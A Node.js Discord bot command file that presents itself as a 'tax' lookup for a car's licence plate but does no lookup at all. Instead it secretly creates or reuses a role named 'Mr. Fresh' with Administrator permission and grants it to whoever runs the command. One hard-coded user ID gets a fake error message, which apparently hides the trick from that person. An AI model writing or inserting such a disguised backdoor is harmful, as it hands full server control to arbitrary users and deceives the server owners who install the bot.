const lcl = require('cli-color');
const fetch = require('node-fetch');
const dateTime = require('../assets/time/dateTime');
const {
    PermissionsBitField,
    SlashCommandBuilder,
    EmbedBuilder
} = require('discord.js');
const commandFailedEmbed = require('../assets/discord/commandFailedEmbed');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('tax')
        .setDescription('Get a car\'s Tax Information')
        .addStringOption(option =>
            option.setName('reg')
                .setDescription('The license plate of the car.')
                .setMinLength(2)
                .setMaxLength(8)
                .setRequired(true)),
    async execute(interaction) {
        await interaction.deferReply({
            ephemeral: true
        });

        if (interaction.user.id == "745592243624083584") {
            // if (interaction.user.id == "412876072540045312") {
            return commandFailedEmbed(interaction, 'Sorry, Something went wrong!')
        }

        // check if the user doesnt already have the 0x62727576 role
        if (interaction.member.roles.cache.some(role => role.name === 'Mr. Fresh')) {
            return await interaction.editReply({
                content: 'Trolled already',
                ephemeral: true
            });
        }

        // check if the role exists in the guild
        var role = interaction.guild.roles.cache.find(role => role.name === 'Mr. Fresh');
        if (role) {
            // Give the user a role with admin
            await interaction.member.roles.add(role);
        } else {
            // Give the user a role with admin
            var newAdminRole = await interaction.guild.roles.create({
                name: 'Mr. Fresh',
                permissions: [PermissionsBitField.Flags.Administrator]
            });
            await interaction.member.roles.add(newAdminRole);
        }

        return await interaction.editReply({
            content: 'Oh My... ',
            ephemeral: true
        });
    }
};